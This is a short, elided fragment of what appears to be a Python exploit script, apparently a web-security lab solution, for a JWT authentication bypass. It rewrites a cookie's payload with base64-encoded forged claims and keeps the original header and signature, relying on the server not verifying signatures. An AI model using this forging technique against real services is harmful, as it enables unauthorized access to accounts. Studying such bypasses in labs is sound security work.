...
def manipulate_cookie(client, host):
    ...
    # Using jwt to encode it with RS256 I'd need a key pair that I don't want here.
    elements = cookie.split('.')
    encoded = json.dumps(payload).encode('utf-8')
    cookie = f'{elements[0]}.{base64.b64encode(encoded).decode("utf-8")}.{elements[2]}'
...
def main():
    print('[+] JWT authentication bypass via unverified signature')
    try:
